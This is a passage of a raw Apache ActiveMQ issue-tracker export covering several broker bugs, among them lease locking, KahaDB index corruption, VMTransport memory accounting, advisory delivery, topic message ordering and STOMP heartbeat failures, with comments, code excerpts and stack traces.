The patch I attached may reveal the cause.;;;","21/Feb/13 16:23;st.h;Please find the query log attached. This is a simple test I have run on two Ubuntu servers VMs. It is basically starting node-h03-ap21 in console mode, which becomes master. Then I started up node-h03-ap22 in console mode, which takes over as master. node-h03-ap21 automatically quits as soon as node-h03-ap22 becomes master.;;;","22/Feb/13 02:05;wangyin;The cause is that LeaseDatabaseLocker always succeed updating the broker name (the owner of the lease lock) by later lease time in contrast to the current lease owner,that means new broker will always obtain the lease lock and the previous owner has to give up the lock and becomes slave. 
;;;","22/Feb/13 02:10;wangyin;The patch works for me and you may give a try.;;;","22/Feb/13 19:49;gtully;@st.h - thanks for the slq log.
From looking at https://issues.apache.org/jira/secure/attachment/12570319/mysql.log, it looks like a configuration problem.
node-h03-ap21 is obtaining a 5s lease that it renews every 10s. So there is a s period when the lease is available to others.

It needs to obtain a 10 second lease and update it every 5 seconds. So that a second (slave) broker always sees time > now when it attempts an update as part of an acquire.

You need:
{code}
<jdbcPersistenceAdapter ... lockKeepAlivePeriod=""5000"">
   ..
   <locker>
     <lease-database-locker lockAcquireSleepInterval=""10000""/>
   </locker>
{code}
lockAcquireSleepInterval is the lease duration, lockKeepAlivePeriod is the lease renew period. On a renew, the lease is extended by the lockAcquireSleepInterval (lease duration). So a master is always (lockAcquireSleepInterval - lockKeepAlivePeriod) ahead with its lease.
In short, ensure: lockAcquireSleepInterval > lockKeepAlivePeriod.

Can you verify this.
I think it may also makes sense to add lease related attributes to this locker. leaseDuration, leaseRenewPeriod so that it is a little more intuitive and obvious that the leaseDuration > leaseRenewPeriod
;;;","23/Feb/13 11:12;wangyin;[~gtully]st.h uploaded the query log not me.
In fact I already know that lockAcquireSleepInterval should be greater than lockKeepAlivePeriod.
Their names are not intuitive indeed, new names seem very well.
I had tested your suggested configuration before you told me, there are two problems:
1. The duplicate hiding brokerService variable in JDBCPersistenceAdapter causes the presence of multiple master brokers(solved by AMQ-4108).
2. The subsequent problem after problem 1 is that a new startup broker always succeeds in obtaining the lease lock and becomes master and the previous master unexpectedly loses the lock and terminates.No brokers can keep obtaining the lease lock all the time.
The cause is that LeaseDatabaseLocker always succeed updating the broker name (the owner of the lease lock) by later lease time in contrast to the current lease owner.
I have tested my patch and it solves the problems.
Can you review and verify it? ;;;","25/Feb/13 12:06;gtully;@SouNayi  - thanks for the feedback. on {quote}The cause is that LeaseDatabaseLocker always succeed updating the broker name (the owner of the lease lock) by later lease time in contrast to the current lease owner.{quote}

Can you make a variant of https://fisheye6.atlassian.com/viewrep/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/store/jdbc/LeaseDatabaseLockerTest.java that shows the problem? I don't see a problem against derby in the unit test. Note: in the unit test there is no periodic call to keepalive.
The intent of the update to acquire a lock checks the TIME value against current time and sets it to obtain the lease. It should (and does) fail if the lease is still valid. ie: the time is set to a value in the future.https://issues.apache.org/jira/browse/AMQ-4122?page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#;;;","25/Feb/13 13:06;st.h;Gary, I can confirm expected behavior when applying your changes. Thanks. However, I would suggest the following changes:
- modify the documentation to show the correct configuration. currently it shows {{lockKeepAlivePeriod=""10000""  lockAcquireSleepInterval=""5000""}}, which has been the config I used for the tests.
- in case lockAcquireSleepInterval < lockKeepAlivePeriod, at least log a warning.;;;","26/Feb/13 08:01;wangyin;@Gary,verification is passed for amq 5.8.
I misread the parameter order for the lease obtain statement so I made a wrong presumption.
Sorry for your time.;;;","26/Feb/13 15:28;gtully;thanks for closing the loop.

added LOG warning if lockKeepAlivePeriod < lockAcquireSleepInterval;;;","24/Apr/13 18:43;jgaudet;I noticed that the code in the attached patch differs from the code in 5.8.  Although perhaps different in form, is this fix a part of 5.8?;;;","06/Mar/14 09:05;metatech;For those using ServiceMix 4.5, the file ""amq_dual_master_5.7_backport.patch"" provides a backport for ActiveMQ 5.7. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
Index page overflow (when a value does not fit in a page) can lead to duplicate calls to free,AMQ-4118,12612791,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,19/Oct/12 22:14,04/Jun/13 18:10,14/Jul/23 05:43,19/Oct/12 22:21,5.6.0,5.7.0,,,,5.8.0,,,Message Store,,,,0,index,kahadb,,,,,,,"An overflowed chain is release when it is no longer needed, but the new end page was not stored in the cache, the old value as a part page is reused and freed again. boom. Keeping the cache in sync sorts this.
A workaround is to disable the index page cache with a small indexCacheSize.
Durable subs make this more visible, but the failure symptoms vary with usage. A typical scenario is a classcast when the page is reused in the wrong context or a npe when the free page is loaded from disk.
With durable subs with selectors and large backlogs, the sequence set expansion and shrinkage produces values that can overflow easily. This scenario produced a nice test.

Some resultant stack traces that are symptomatic:
{code}2012-10-19 22:25:11,928 [exPageUsage#5-2] - ERROR MessageDatabase                - KahaDB failed to store to Journal
java.io.EOFException: Chunk stream does not exist, page: 1344 is marked free
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:481)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:458)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:455)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:431)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:388)
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)
	at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)
	at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:680)
	at org.apache.kahadb.index.BTreeNode.get(BTreeNode.java:562)
	at org.apache.kahadb.index.BTreeIndex.get(BTreeIndex.java:184)
	at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.get(MessageDatabase.java:2616)
	at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1210)
	at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1002)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:790)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1000)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:933)
	at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:925)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:837)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:819)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:723)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:706)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.acknowledge(KahaDBTransactionStore.java:519)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore$2.acknowledge(KahaDBTransactionStore.java:222)
	at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:528)
	at org.apache.activemq.broker.region.DurableTopicSubscription.acknowledge(DurableTopicSubscription.java:279)
	at ..{code}
{code}java.lang.ClassCastException: java.lang.Long cannot be cast to java.lang.String
        at java.lang.String.compareTo(String.java:92)
        at java.util.Arrays.binarySearch0(Arrays.java:2001)
        at java.util.Arrays.binarySearch(Arrays.java:1943)
        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:371)
        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:369)       
        at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)        
at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.put(MessageDatabase.java:2592)
        at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1168)        at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2082)        at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1095)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:768)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1092)
        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:943)
        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:855)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267)
        at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:85)
...{code}
{code}java.lang.NullPointerException
        at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:264)
        at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)
        at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:676)
        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:369)
        at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)
        at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.put(MessageDatabase.java:2592)
        at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1168)
        at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2082)
        at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1095)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:768)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1092)
        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:943)
        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:855)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267){code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4259,,,,,,,,,,,,,AMQ-3982,AMQ-3906,AMQ-4573,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250051,,,Fri Oct 19 22:21:22 UTC 2012,,,,,,,,,,,"0|i0ao1b:",60167,,,,,,,,,,,,,,,,,,,,,"19/Oct/12 22:21;gtully;fix in http://svn.apache.org/viewvc?rev=1400317&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT Inactivity Monitor doesn't respect client keep alive setting.,AMQ-4117,12612789,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,19/Oct/12 21:40,16/Nov/12 10:03,14/Jul/23 05:43,19/Oct/12 21:42,5.7.0,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,The MQTT Inactivity Monitor starts its monitoring thread to early which means that it cannot honor the keepAlive time sent by the client.  The transport should wait until its received the client CONNECT command before it starts its monitoring thread. ,,mozdemir,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,250049,,,Fri Nov 16 10:01:40 UTC 2012,,,,,,,,,,,"0|i0ao0v:",60165,,,,,,,,,,,,,,,,,,,,,"19/Oct/12 21:42;tabish;fixed in trunk.;;;","16/Nov/12 10:01;mozdemir;Despite sending PINGREQ from client by 10 seconds interval, broker still disconnects client after default keepAlive time. (Using v.5.7.0);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory usage is not cleared from the source queue when a message is moved to another queue over the VMTransport,AMQ-4116,12612520,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,stirlingc,stirlingc,19/Oct/12 00:47,31/Jan/13 21:50,14/Jul/23 05:43,31/Jan/13 21:50,5.7.0,,,,,5.8.0,,,Transport,,,,0,,,,,,,,,"Reproduction
============
Using VMTransport:

1. Produce a message on queue A and verify that queue A's memory usage increases
2. Consume the message from queue A and verify that queue A's memory usage decreases.
3. Resend the message to queue B.

Expected: Queue A's memory usage is not increased by the enqueue to queue B.
Actual: Queue A's memory usage increases and no memory usage increase occurs on queue B.

Symptom
=======
When messages are moved between queues using the VMTransport, they continue to contribute to the memory usage of the source queue rather than the destination queue.

The correct behaviour (memory usage decreases from queue A and increases in queue B) is exhibited by non-VMTransport (e.g., TCP).

Cause
=====
When the message is first sent to queue A, it's memoryUsage field is set to match queue A's:

{code:title=org.apache.activemq.broker.region.Queue}
public void send(final ProducerBrokerExchange producerExchange, final Message message) throws Exception {
    final ConnectionContext context = producerExchange.getConnectionContext();
    // There is delay between the client sending it and it arriving at the
    // destination.. it may have expired.
    message.setRegionDestination(this);
...
{code}

{code:title=org.apache.activemq.command.Message}
public void setRegionDestination(org.apache.activemq.broker.region.Destination destination) {
    this.regionDestination = destination;
    if(this.memoryUsage==null) {
        this.memoryUsage=regionDestination.getMemoryUsage();
    }
}
{code}

As the message moves across the transport, it is copied along with the memoryUsage field:

{code:title=org.apache.activemq.command.Message}
protected void copy(Message copy) {
    super.copy(copy);
...
    copy.memoryUsage=this.memoryUsage;
...
{code}

When the message is sent to the second queue, memoryUsage is non-null, so setRegionDestination(...) does not update memoryUsage to reflect the new destination queue.

When the destination queue accepts the message, the memoryUsage of the source queue is (incorrectly) increased:

{code:title=org.apache.activemq.command.Message}
public int incrementReferenceCount() {
    int rc;
    int size;
    synchronized (this) {
        rc = ++referenceCount;
        size = getSize();
    }

    if (rc == 1 && getMemoryUsage() != null) {
        getMemoryUsage().increaseUsage(size);
{code}

This mal-behaviour is not exhibited by other transports since they serialize Message and memoryUsage is transient.  As a result, the call to setRegionDestination(...) will properly update memoryUsage when the message arrives at the destination queue.

Solution
========
There are a number of possible solutions, any of which would correct the behaviour (although I am unsure what side-effects they may have on other behaviour):

1. It seems odd that memoryUsage is copied when Message is copied.  If Message.copy(...) is used as a shortcut to avoid serialization/deserialization on VMTransport, then it should have the same semantics and avoid copying transient fields.

2. It seems odd that setRegionDestination(...) would not always set the memoryUsage to match the destination's memoryUsage.

3. ActiveMQConnection has a comment regarding concessions made for messages transmitted by the VM transport:

{code:title=org.apache.activemq.ActiveMQConnection}
public void onCommand(final Object o) {
    final Command command = (Command)o;
    if (!closed.get() && command != null) {
        try {
            command.visit(new CommandVisitorAdapter() {
                @Override
                public Response processMessageDispatch(MessageDispatch md) throws Exception {
                    waitForTransportInterruptionProcessingToComplete();
                    ActiveMQDispatcher dispatcher = dispatchers.get(md.getConsumerId());
                    if (dispatcher != null) {
                        // Copy in case a embedded broker is dispatching via
                        // vm://
                        // md.getMessage() == null to signal end of queue
                        // browse.
                        Message msg = md.getMessage();
                        if (msg != null) {
                            msg = msg.copy();
                            msg.setReadOnlyBody(true);
                            msg.setReadOnlyProperties(true);
                            msg.setRedeliveryCounter(md.getRedeliveryCounter());
                            msg.setConnection(ActiveMQConnection.this);
                            md.setMessage(msg);
                        }
                        dispatcher.dispatch(md);
                    }
                    return null;
                }
{code}

Adding a call to msg.setMemoryUsage(null) would address this bug.

The latter appears to be the least intrusive, although it will only address the case of VMTransport messages moving between producers/consumers. Queue contains shortcut methods for moving messages between queues (e.g., copyMessageTo).  I have not verified if these methods exhibit the same behaviour re: memory usage, but if so, they would not be addressed by patching ActiveMQConnection.

Our main concern is with the reported use case, so I've attached a patch for ActiveMQConnection and unit test to demonstrate the behaviour.",,stirlingc,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4147,,,,,,,,,,,,,,,,"19/Oct/12 01:18;stirlingc;AMQ4116.patch;https://issues.apache.org/jira/secure/attachment/12549793/AMQ4116.patch","19/Oct/12 01:17;stirlingc;AMQ4116Test.java;https://issues.apache.org/jira/secure/attachment/12549792/AMQ4116Test.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249704,,,Thu Jan 31 21:50:26 UTC 2013,,,,,,,Patch Available,,,,"0|i0agkn:",58958,,,,,,,,,,,,,,,,,,,,,"19/Oct/12 01:17;stirlingc;Unit test demonstrating bug on VMTransport and how TCP transport does not exhibit bug.;;;","19/Oct/12 01:18;stirlingc;ActiveMQConnection patch to resolve issue.;;;","31/Jan/13 21:46;tabish;Agreed that when copied in ActiveMQConnection there's definitely no need for the copy to retain a reference to the MemoryUsage.  Will look at AMQ-4147 also but applying this patch won't hurt anything even if we take action on 4147.  ;;;","31/Jan/13 21:50;tabish;Fix applied, thanks for the test and patch.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make sure there's no XSS in web demos,AMQ-4115,12612404,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,18/Oct/12 10:04,23/Apr/13 08:16,14/Jul/23 05:43,18/Oct/12 10:59,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,We need to ensure that everything is properly escaped when displayed in the browser,,dejanb,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249533,,,Fri Jan 04 11:04:58 UTC 2013,,,,,,,,,,,"0|i0afc7:",58758,,,,,,,,,,,,,,,,,,,,,"18/Oct/12 10:59;dejanb;This should be fixed now with svn revision 1399577. Thanks to Gursev Kalra for reporting.;;;","04/Jan/13 11:04;gtully;CVE-2012-6092;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Web console can't send messages to the secured broker,AMQ-4110,12612009,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,16/Oct/12 10:10,16/Oct/12 11:05,14/Jul/23 05:43,16/Oct/12 11:05,5.7.0,,,,,5.8.0,,,,,,,0,,,,,,,,,"When trying to send a message to the secured broker from web console you'll get the 

{code}javax.jms.JMSException: User name [null] or password is invalid.{code}

error, meaning that's the only operation that doesn't use proper credentials",,dejanb,lionel.cons,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248953,,,Tue Oct 16 11:05:35 UTC 2012,,,,,,,,,,,"0|i0a2pb:",56711,,,,,,,,,,,,,,,,,,,,,"16/Oct/12 11:01;lionel.cons;Since the web console seems to use NIO, this issue is maybe the same one as AMQ-3996.;;;","16/Oct/12 11:05;dejanb;Fixed with svn revision 1398731.

[~lionel.cons] it's not related to [AMQ-3996], this was purely web console issue;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot receive 'ActiveMQ.Advisory.MasterBroker' messages when master dies and slave takes control,AMQ-4108,12611903,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,ajcohen,ajcohen,15/Oct/12 20:42,02/May/13 02:30,14/Jul/23 05:43,17/Oct/12 15:18,5.7.0,,,,,5.8.0,,,Broker,,,,0,advisory,,,,,,,,"Message consumers do not receive 'ActiveMQ.Advisory.MasterBroker' advisory messages when the master is killed and the slave takes over.

Steps:

1) Start Master and Slave brokers in Pure ""Master / Slave"" Configuration.
2) Create a client consumer for the 'ActiveMQ.Advisory.MasterBroker' topic. (See code below)
3) Kill the Master broker. (kill -9)
4) The client will failover to the slave. Note the Web Console shows there is one en-queued message for the 'ActiveMQ.Advisory.MasterBroker' topic.
5) The consumer will never receive/dequeue this message. (Event after restarting the client)


Two other observations:

1) Other advisories (such as the 'ActiveMQ.Advisory.Connection')are working. This only seems to be a problem with 'ActiveMQ.Advisory.MasterBroker'.

2) Sending a message to the 'ActiveMQ.Advisory.MasterBroker' topic via the Web Console is properly received and dequeued by the consumer.
 

Code:

Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
MessageConsumer consumer = session.createConsumer( AdvisorySupport.getMasterBrokerAdvisoryTopic() );
// It will receive Connection Advisory messages! Just not MasterBroker advisory messages :(
//MessageConsumer consumer = session.createConsumer( AdvisorySupport.getConnectionAdvisoryTopic() );

Message msg = null;
while (true) {
        // Also doesn't work with MessageListener implementation
        msg = consumer.receive(30000);
        System.out.println(name + "" Received: "" + msg);
} ",Windows or Linux. Java 1.7.0_07. ,ajcohen,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4122,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248817,,,Wed Oct 17 15:18:27 UTC 2012,,,,,,,,,,,"0|i0a067:",56301,,,,,,,,,,,,,,,,,,,,,"17/Oct/12 15:18;dejanb;Fixed with svn revision 1399302

I made ActiveMQ.Advisory.MasterBroker topic retroactive, which means that message will be sent to the consumer when it becomes available.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message order can be broken for Topic under a high load when topicPrefetch=1 and comsumer is slow,AMQ-4107,12611796,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,sdcf,sdcf,15/Oct/12 08:09,12/Jan/15 12:02,14/Jul/23 05:43,12/Jan/15 12:02,5.6.0,,,,,5.11.0,,,Transport,,,,2,,,,,,,,,"For <amq:policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""30mb"" {color:red}topicPrefetch=""1""{color} blockedProducerWarningInterval=""30"">

Short excerpt from TopicSubscription class:
public void add(MessageReference node) throws Exception {

…..
              if ({color:red}!isFull(){color} && matched.isEmpty()  && !isSlave()) {
            // if maximumPendingMessages is set we will only discard messages which
            // have not been dispatched (i.e. we allow the prefetch buffer to be filled)
       {color:red}dispatch(node);{color}                   <- Second message will go this way and might be dispatched sooner than first one.
            setSlowConsumer(false);
        } else {
…….
if ({color:red}matched.tryAddMessageLast(node, 10)){color} {    <- first message will be put in the VMCursor queue and might be dispatched later 
        
break;
                        }
.....
 {color:red}dispatchMatched();{color}   <- First message won't be dispatched immediately because !isFull() is still false
}
Possible scenario as I can see it from logs:
1. First message has arrived and !isFull() is false because consumer didn't take some previous message yet.
2. First message will be processed by tryAddMessageLast in VMPendingMessageCursor class and will be dispatched very lately because !isFull() is still false.
3. Meanwhile consumer reads some previous message and !isFull() will return true.    
4. Second message will be dispatched immediately and might be first to be delivered. 
5. Then first message is dispatched.
6. Message order is broken.
",,alexanderz,choijw1,gtully,nickolay_martinov,sdcf,tbain98,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Nov/12 09:08;sdcf;4107.diff;https://issues.apache.org/jira/secure/attachment/12552440/4107.diff","09/Jan/14 10:01;alexanderz;ActiveMQ-5.9-AMQ-4107.patch;https://issues.apache.org/jira/secure/attachment/12622146/ActiveMQ-5.9-AMQ-4107.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,248654,,,Mon Jan 12 12:02:13 UTC 2015,,,,,,,,,,,"0|i09xjj:",55875,,,,,,,,,,,,,,,,,,,,,"07/Nov/12 09:08;sdcf;Please have a look at the attachment for the patch to fix wrong message order issue.The patch synchronizes a message processing and remove excess syncs inside added sync block.;;;","17/Dec/13 13:11;nickolay_martinov;Problem reproduces on 5.9.;;;","09/Jan/14 10:01;alexanderz;A patch to fix the problem on ActiveMQ 5.9;;;","10/Jan/14 13:08;gtully;@Alexander that patch looks good but it would be great if it included a junit test case that shows the problem can protect the change into the future.;;;","26/Sep/14 16:14;tbain98;Will this patch only be applied if a unit test is added for it?;;;","29/Sep/14 17:55;nickolay_martinov;Sorry. We have used JMeter based tests for fix proof and don't plan to contribute unit tests at the moment.;;;","12/Jan/15 11:30;gtully;seems the intermittent failure of org.apache.activemq.usecases.TwoMulticastDiscoveryBrokerTopicSendReceiveTest shows this problem;;;","12/Jan/15 12:02;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/8dbb48a2

TwoMulticastDiscoveryBrokerTopicSendReceiveTest provided the test;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP+NIO and Heartbeats gives consistent InactivityIOException,AMQ-4106,12611754,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,gmallard,gmallard,14/Oct/12 14:22,23/Oct/12 19:16,14/Jul/23 05:43,23/Oct/12 19:14,5.7.0,,,,,5.8.0,,,STOMP,,,,0,,,,,,,,,"When a stomp 1.1 client:

a) connects to a stomp+nio transport
b) elects to send heartbeats when the network is idle

the first several heartbeat sends appear to succeed, but then the connection is forcibly closed by the broker.

From activemq.log:

2012-10-14 09:53:07,755 | WARN  | Transport Connection to: tcp://127.0.0.1:36440 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>10000) long: tcp://127.0.0.1:36440 | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ InactivityMonitor Worker

From wrapper.log:

INFO   | jvm 1    | 2012/10/14 09:53:07 |  WARN | Transport Connection to: tcp://127.0.0.1:36440 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>10000) long: tcp://127.0.0.1:36440


I am able to reproduce this with either:

a) the current Ruby stomp gem
b) the current golang stompngo package

It is unclear to me whether:

a) the AMQ heartbeat code is not tolerant as the specification suggests
b) the AMQ heartbeat receiver is not reading or recognizing heartbeats at all

In all cases these tests succeed with either:

a) AMQ 5.7.0 stomp without nio
b) Apollo
c) RabbitMQ
d) a client that only receives heartbeats, but does not send them

I will attach a Ruby client example shortly.

